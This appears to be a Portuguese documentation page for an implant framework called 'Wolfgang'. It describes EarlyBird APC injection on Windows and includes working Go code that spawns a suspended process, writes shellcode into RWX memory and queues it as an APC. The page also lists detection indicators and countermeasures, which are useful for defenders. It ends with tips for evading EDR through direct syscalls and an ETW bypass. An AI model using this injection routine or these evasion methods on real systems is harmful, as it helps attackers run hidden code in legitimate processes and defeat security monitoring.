    EarlyBird APC Injection¶

    O que é¶

    EarlyBird APC injection é uma técnica que usa Asynchronous Procedure Calls (APCs) para executar shellcode na thread principal de um processo suspenso. O shellcode é enfileirado como APC antes do processo ser resumido, garantindo que execute antes do entry point do processo alvo -- e antes que hooks de EDR no processo alvo sejam inicializados.

    O nome "EarlyBird" vem dessa vantagem temporal: o shellcode é o "primeiro pássaro" a executar, antes de qualquer outro código.

    Por que funciona¶

    APCs no Windows¶

    APCs são callbacks que o Windows enfileira para execução em uma thread específica. Quando uma thread entra em estado "alertable" (via SleepEx, WaitForSingleObjectEx, ou ao ser resumida de estado suspenso), todas as APCs enfileiradas são executadas.

    Quando um processo é criado com CREATE_SUSPENDED:

    1. O kernel cria o processo e a thread principal
    2. A thread principal está em estado suspenso, não inicializado
    3. Quando ResumeThread é chamado, a thread processa APCs enfileiradas antes de executar o entry point

    Isso significa que APCs enfileiradas via QueueUserAPC executam antes de:

    • O entry point do processo (WinMain, main)
    • DllMain de DLLs carregadas
    • TLS callbacks
    • Hooks de EDR instalados via DLL injection

    Vantagem sobre Process Hollowing¶

    Enquanto process hollowing substitui a imagem inteira do PE (complexo, requer parse de PE, relocations, etc.), EarlyBird simplesmente escreve shellcode em memória alocada e aponta o APC para ele. É significativamente mais simples e requer menos interação com o processo alvo.

    Implementação no Wolfgang¶

    Fluxo completo¶

    func platformEarlyBirdInject(targetExe string, shellcode []byte) error {
    // 1. Cria processo suspenso
    var si windows.StartupInfo
    var pi windows.ProcessInformation
    si.Cb = uint32(unsafe.Sizeof(si))

    windows.CreateProcess(
        nil, argv, nil, nil, false,
        winapi.CreateSuspended,
        nil, nil, &si, &pi,
    )

    Alocação e escrita¶

        // 2. Aloca memória RWX no processo alvo
    addr, _ := winapi.VirtualAllocEx(
        uintptr(pi.Process), 0,
        uintptr(len(shellcode)),
        winapi.MemCommit|winapi.MemReserve,
        winapi.PageExecuteReadWrite,
    )

    // 3. Escreve o shellcode
    winapi.WriteProcessMemory(uintptr(pi.Process), addr, shellcode)

    APC e resume¶

        // 4. Enfileira APC apontando para o shellcode
    queueUserAPC(addr, uintptr(pi.Thread), 0)

    // 5. Resume a thread — APC executa antes do entry point
    resumeThread(uintptr(pi.Thread))

    // 6. Cleanup
    windows.CloseHandle(pi.Thread)
    windows.CloseHandle(pi.Process)
    return nil
}

    Helpers¶

    func queueUserAPC(pfnAPC, hThread, dwData uintptr) error {
    ret, _, err := procQueueUserAPC.Call(pfnAPC, hThread, dwData)
    if ret == 0 { return err }
    return nil
}

func resumeThread(hThread uintptr) (uint32, error) {
    ret, _, err := procResumeThread.Call(hThread)
    if int32(ret) == -1 { return 0, err }
    return uint32(ret), nil
}

    Detecção¶

    IOC Descrição
    CreateProcess + CREATE_SUSPENDED Processo criado suspenso
    VirtualAllocEx com PAGE_EXECUTE_READWRITE Alocação RWX cross-process
    WriteProcessMemory Escrita em memória de outro processo
    QueueUserAPC em thread suspensa APC em thread que ainda não iniciou
    ResumeThread após QueueUserAPC Sequência indicativa
    Região RWX em processo legítimo Memória executável sem backing em disco

    Padrão de detecção¶

    A sequência é distintiva e facilmente correlacionada por EDRs:

    CreateProcess(SUSPENDED) → VirtualAllocEx(RWX) →
WriteProcessMemory → QueueUserAPC → ResumeThread

    Contramedidas¶

    • Kernel callbacks: PsSetCreateProcessNotifyRoutine detecta processo suspenso
    • APC monitoring: Hooks em NtQueueApcThread para detectar APCs cross-process
    • Memory scanning on resume: EDRs podem scanear memória RWX quando um processo é resumido
    • ETW Threat Intelligence: Provider kernel-mode que detecta VirtualAllocEx RWX

    Evasão de detecção¶

    Combinações que aumentam a furtividade:

    • Direct syscalls para NtAllocateVirtualMemory e NtWriteVirtualMemory evitam hooks em userland
    • ETW bypass silencia eventos de telemetria no processo do implant
    • Alocação RW + VirtualProtect RX em vez de alocação direta RWX
